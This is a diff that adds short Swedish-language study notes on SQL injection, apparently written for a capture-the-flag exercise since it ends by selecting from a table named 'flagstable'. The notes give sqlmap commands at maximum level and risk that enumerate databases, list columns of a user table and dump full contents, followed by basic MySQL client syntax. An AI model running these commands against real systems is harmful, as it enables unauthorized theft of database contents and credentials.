@@ -1,0 +1,32 @@
+SQL-injections
+
+Gör ett log-in-försök med Burp.
+Plocka sen den requesten och lägg i en *fil*.
+Nyttja sen nedanstående kommando:
+
+sqlmap -r *fil* --level 5 --risk 3 -dbs
+
+Du kommer då förhoppningsvis få upp en lista med databaser.
+
+Skriv sen:
+
+sqlmap -r *fil* --level 5 --risk 3 -D mysql -T *user* --colums
+ 
+Jobba dig igenom databasen tills du hittar något bra :D
+
+Alternativ, testa nedanstående direkt efter lyckad injektion:
+
+sqlmap -r *fil* --level 5 --risk 3 --dump
+
+För att starta MySQL:
+mysql -u användarnamn -p    Användarnamn byts ut mot vilken användare du vill logga in som, -p betyder att
+                            du vill ange lösenord. Du kommer dock bli frågad på det efter att du klickat enter.
+
+Syntax
+; = avsluta det du gör just nu
+show databases; Visa databaser (glöm ej ;)
+use "databasnamn" Denna använder du för att börja använda den önskade databasen
+show tables; Här ser du alla tables i databasen
+select * from flagstable Denna väljer allt som finns inne i tablet flagstable
+
+
